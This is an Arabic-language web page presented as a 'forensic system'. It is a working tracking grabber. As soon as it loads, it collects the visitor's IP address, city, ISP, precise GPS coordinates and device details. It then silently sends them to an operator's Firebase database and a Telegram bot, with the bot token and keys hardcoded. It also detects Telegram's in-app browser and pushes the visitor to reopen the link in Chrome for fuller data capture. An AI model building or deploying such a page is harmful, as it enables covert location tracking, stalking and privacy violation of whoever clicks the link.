<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>النظام الجنائي - البيانات الكاملة</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
        body{background:#000;color:#0f0;padding:10px}
        .container{max-width:800px;margin:0 auto;background:rgba(0,20,0,0.95);border:2px solid #0f0;border-radius:5px;padding:20px}
        h1{text-align:center;color:#0f0;margin-bottom:10px}
        .warning{background:rgba(255,165,0,0.2);border:2px solid #ffa500;color:#ffa500;padding:15px;margin:15px 0;border-radius:5px;text-align:center}
        .success{background:rgba(0,255,0,0.2);border:2px solid #0f0;color:#0f0;padding:15px;margin:15px 0;border-radius:5px;text-align:center}
        .data-box{background:rgba(0,255,0,0.05);border:1px solid #0a0;padding:10px;margin:10px 0;border-radius:3px}
        .label{color:#0a0;font-size:0.8rem;margin-bottom:5px}
        .value{color:#0f0;font-size:0.95rem;font-weight:bold;word-break:break-all}
        .log-console{background:#000;border:1px solid #0a0;padding:10px;margin:15px 0;font-size:0.7rem;height:200px;overflow-y:auto;color:#0a0}
        .log-line{margin:3px 0}.log-line.success{color:#0f0}.log-line.error{color:#f00}.log-line.warn{color:#ff0}
        button{width:100%;padding:15px;background:#0f0;color:#000;border:none;border-radius:5px;font-weight:bold;margin:10px 0;cursor:pointer}
        button:hover{background:#0a0}
        #map{height:300px;width:100%;margin:15px 0;border:2px solid #0f0;display:none}
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ النظام الجنائي</h1>
        
        <div id="telegramWarning" class="warning" style="display:none">
            ⚠️ <strong>تحذير:</strong> أنت تستخدم Telegram WebView<br>
            العديد من الميزات معطلة!<br>
            <strong>افتح الرابط في متصفح Chrome للحصول على بيانات كاملة</strong>
        </div>

        <div id="successMsg" class="success" style="display:none">
            ✅ تم جمع البيانات بنجاح!<br>
            <small>تحقق من Firebase و Telegram</small>
        </div>

        <div id="dataContainer"></div>
        
        <div id="map"></div>
        
        <button onclick="collectData()">🔄 إعادة جمع البيانات</button>
        
        <div class="log-console" id="console"></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCVyg-EAtI-oumlWnBOVNKBjwufbTS6H5w",
            authDomain: "onx-gp-aade0.firebaseapp.com",
            databaseURL: "https://onx-gp-aade0-default-rtdb.firebaseio.com",
            projectId: "onx-gp-aade0",
            storageBucket: "onx-gp-aade0.firebasestorage.app",
            messagingSenderId: "434498224932",
            appId: "1:434498224932:web:7c3b1d6e28b90168e869b1",
            measurementId: "G-M3K67GR34L"
        };

        const BOT_TOKEN = "7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s";
        const CHAT_ID = "910624538";
        let data = {}, map = null;

        function log(msg, type='info') {
            const c = document.getElementById('console');
            const l = document.createElement('div');
            l.className = `log-line ${type}`;
            l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            c.appendChild(l);
            c.scrollTop = c.scrollHeight;
            console.log(type, msg);
        }

        // 🔍 كشف إذا كان المستخدم داخل Telegram
        function isTelegramWebView() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            return (/telegram|tgweb/i.test(ua)) || 
                   (/content:\/\/org\.telegram/i.test(window.location.href));
        }

        // 🌐 جلب IP مع 3 محاولات
        async function getIP() {
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://api.myip.com'
            ];
            
            for (let api of apis) {
                try {
                    const res = await fetch(api, {timeout: 5000});
                    const json = await res.json();
                    return json.ip || json.IPAddress;
                } catch(e) {
                    log(`فشل ${api}`, 'warn');                }
            }
            return null;
        }

        // 📍 جلب الموقع من IP
        async function getIPLocation(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                return {
                    country: data.country_name,
                    city: data.city,
                    isp: data.org,
                    lat: data.latitude,
                    lng: data.longitude
                };
            } catch(e) {
                return null;
            }
        }

        // 🛰️ GPS
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    err => {
                        log(`GPS Error: ${err.message}`, 'error');
                        resolve(null);
                    },
                    {enableHighAccuracy: true, timeout: 10000}
                );
            });
        }

        // 📊 جمع كل البيانات
        async function collectData() {
            log('=== بدء جمع البيانات ===', 'warn');            document.getElementById('dataContainer').innerHTML = '';
            
            // بيانات أساسية
            data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                os: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                online: navigator.onLine
            };

            // 🔍 كشف Telegram
            if (isTelegramWebView()) {
                document.getElementById('telegramWarning').style.display = 'block';
                log('⚠️ Telegram WebView detected - محدود!', 'error');
            }

            // 🌐 IP
            log('جاري جلب IP...', 'info');
            const ip = await getIP();
            if (ip) {
                data.ip = ip;
                log(`✓ IP: ${ip}`, 'success');
                
                // موقع من IP
                const loc = await getIPLocation(ip);
                if (loc) {
                    data.country = loc.country;
                    data.city = loc.city;
                    data.isp = loc.isp;
                    data.latIP = loc.lat;
                    data.lngIP = loc.lng;
                    log(`✓ الموقع: ${loc.city}, ${loc.country}`, 'success');
                }
            } else {
                data.ip = 'Unknown';
                log('✗ فشل جلب IP', 'error');
            }

            // 🛰️ GPS
            log('جاري طلب GPS...', 'info');
            const gps = await getGPS();
            if (gps) {
                data.lat = gps.lat;
                data.lng = gps.lng;
                data.accuracy = gps.accuracy;
                log(`✓ GPS: ${gps.lat}, ${gps.lng}`, 'success');
                showMap(gps.lat, gps.lng);            } else {
                log('✗ GPS مرفوض أو غير متوفر', 'error');
            }

            // عرض البيانات
            displayData();
            
            // إرسال
            await sendToFirebase();
            await sendToTelegram();
            
            document.getElementById('successMsg').style.display = 'block';
            log('=== اكتمل ===', 'success');
        }

        function showMap(lat, lng) {
            const mapEl = document.getElementById('map');
            mapEl.style.display = 'block';
            if (!map) {
                map = L.map('map').setView([lat, lng], 15);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([lat, lng]).addTo(map).bindPopup('📍 موقعك').openPopup();
            }
        }

        function displayData() {
            const container = document.getElementById('dataContainer');
            container.innerHTML = `
                <div class="data-box"><div class="label">🌐 IP</div><div class="value">${data.ip || 'N/A'}</div></div>
                <div class="data-box"><div class="label">📍 الموقع</div><div class="value">${data.city || ''}, ${data.country || ''}</div></div>
                <div class="data-box"><div class="label">🏢 ISP</div><div class="value">${data.isp || 'N/A'}</div></div>
                <div class="data-box"><div class="label">🎯 GPS</div><div class="value">${data.lat ? `${data.lat}, ${data.lng}` : 'غير متوفر'}</div></div>
                <div class="data-box"><div class="label">💻 النظام</div><div class="value">${data.os || 'Unknown'}</div></div>
                <div class="data-box"><div class="label">📱 الشاشة</div><div class="value">${data.screen}</div></div>
            `;
        }

        async function sendToFirebase() {
            try {
                firebase.initializeApp(firebaseConfig);
                const db = firebase.database();
                await db.ref('tracking/' + Date.now()).set(data);
                log('✓ Firebase: تم الحفظ', 'success');
            } catch(e) {
                log('✗ Firebase Failed', 'error');
            }
        }

        async function sendToTelegram() {
            try {                let msg = `🚨 *تقرير جديد*\n\n`;
                msg += `🌐 IP: \`${data.ip}\`\n`;
                msg += `📍 الموقع: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}\n`;
                if (data.lat) msg += `🎯 GPS: ${data.lat}, ${data.lng}\n`;
                msg += `💻 النظام: ${data.os}\n`;
                msg += `📱 الشاشة: ${data.screen}\n`;
                msg += `🕒 ${new Date().toLocaleString('ar-SA')}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
                });
                
                if (data.lat) {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: CHAT_ID, latitude: data.lat, longitude: data.lng})
                    });
                }
                
                log('✓ Telegram: تم الإرسال', 'success');
            } catch(e) {
                log('✗ Telegram Failed', 'error');
            }
        }

        // بدء تلقائي
        window.onload = collectData;
    </script>
</body>
</html>
